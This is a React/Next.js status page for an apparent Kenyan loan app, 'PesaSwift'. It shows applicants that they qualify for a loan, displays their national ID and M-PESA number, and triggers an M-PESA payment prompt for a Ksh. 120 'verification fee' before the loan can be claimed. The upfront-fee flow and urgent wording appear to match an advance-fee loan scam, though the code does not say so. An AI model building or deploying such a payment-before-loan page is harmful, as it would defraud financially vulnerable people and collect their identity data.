'use client';

import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import ThemeToggle from '@/components/ThemeToggle';

export default function StatusPage() {
  const router = useRouter();
  const [data, setData] = useState<any>(null);
  const [loadingPush, setLoadingPush] = useState(false);
  const [pushSent, setPushSent] = useState(false);
  const [pushError, setPushError] = useState('');
  const [checkoutRequestId, setCheckoutRequestId] = useState<string | null>(null);

  useEffect(() => {
    const storedData = sessionStorage.getItem('loanStatusData');
    if (storedData) {
      setData(JSON.parse(storedData));
    } else {
      router.push('/');
    }
  }, [router]);

  // Polling mechanism (waits for real webhook callback)
  useEffect(() => {
    let interval: NodeJS.Timeout;

    if (pushSent && checkoutRequestId) {
      interval = setInterval(async () => {
        try {
          const res = await fetch(`/api/mpesa/status?checkoutRequestId=${checkoutRequestId}`);
          const result = await res.json();
          
          if (result.status === 'SUCCESS') {
            clearInterval(interval);
            router.push('/success');
          } else if (result.status === 'FAILED') {
            clearInterval(interval);
            setPushError('Payment failed or was cancelled. Please try again.');
            setPushSent(false); // allow them to try again
          }
        } catch (err) {
          console.error("Polling error", err);
        }
      }, 3000); // Poll every 3 seconds
    }

    return () => {
      clearInterval(interval);
    };
  }, [pushSent, checkoutRequestId, router]);

  const initiateStkPush = async () => {
    setLoadingPush(true);
    setPushError('');
    
    try {
      const res = await fetch('/api/mpesa/stkpush', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: data.mpesaNumber,
          trackingId: data.trackingId
        })
      });

      const result = await res.json();

      if (!res.ok) {
        setPushError(result.error || 'Failed to initiate STK push');
      } else {
        setCheckoutRequestId(result.data.CheckoutRequestID);
        setPushSent(true);
      }
    } catch (err) {
      setPushError('Network error while initiating payment');
    } finally {
      setLoadingPush(false);
    }
  };

  if (!data) return <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '100vh' }}>Loading...</div>;

  return (
    <main className="status-layout">
      <ThemeToggle />
      
      <div className="status-container">
        <div className="logo-brand status-logo">
          <span className="logo-icon">💸</span>
          <span className="logo-text">Pesa<span className="logo-highlight">Swift</span></span>
        </div>

        {/* Top Banner Message */}
        <div className="status-banner glass-panel">
          <p className="banner-text">
            Hi <strong>{data.name?.split(' ')[0]}</strong>, you qualify for a Loan of <strong className="text-highlight">Ksh. {data.qualifiedAmt?.toLocaleString()}</strong>
          </p>
          <p className="banner-subtext">
            Repayment: <strong>{data.repaymentPeriod} months</strong> at a fixed <strong>{data.interestRate}% interest</strong>.
          </p>
        </div>

        {/* Dynamic Payment Prompt */}
        {pushSent && (
          <div className="payment-alert">
            <div className="alert-spinner" />
            <p>Please enter your M-PESA PIN in the prompt on your phone to complete the verification.</p>
          </div>
        )}

        {pushError && (
          <div className="payment-error-alert">
            <span>⚠️</span> {pushError}
          </div>
        )}

        {/* Details Table */}
        <div className="details-card glass-panel">
          <h4 className="details-header">Review Application Summary</h4>
          <div className="details-grid">
            <div className="details-row">
              <span>Loan Tracking ID</span>
              <strong>{data.trackingId}</strong>
            </div>
            <div className="details-row">
              <span>Account Name</span>
              <strong>{data.name}</strong>
            </div>
            <div className="details-row">
              <span>M-PESA Number</span>
              <strong>{data.mpesaNumber}</strong>
            </div>
            <div className="details-row">
              <span>National ID</span>
              <strong>{data.idNumber}</strong>
            </div>
            <div className="details-row">
              <span>Loan Type</span>
              <strong>{data.loanType}</strong>
            </div>
            <div className="details-row highlight-row">
              <span>Qualified Loan Limit</span>
              <strong className="text-highlight">Ksh. {data.qualifiedAmt?.toLocaleString()}</strong>
            </div>
            <div className="details-row">
              <span>Verification Charge</span>
              <strong>Ksh. {data.verificationFee}</strong>
            </div>
          </div>
        </div>

        {/* Action Area */}
        {!pushSent && (
          <div className="action-panel">
            <p className="action-agreement">
              By clicking "Claim Loan", you authorize PesaSwift to request a verification fee of Ksh. 120 through Safaricom M-PESA.
            </p>
            <button 
              className="btn-primary claim-btn" 
              onClick={initiateStkPush}
              disabled={loadingPush}
            >
              {loadingPush ? 'Processing...' : 'CLAIM LOAN NOW'}
            </button>
          </div>
        )}
        
        <div className="status-footer">
          &copy; 2026 PesaSwift. Go back <a href="/">home</a>.
        </div>
      </div>
    </main>
  );
}
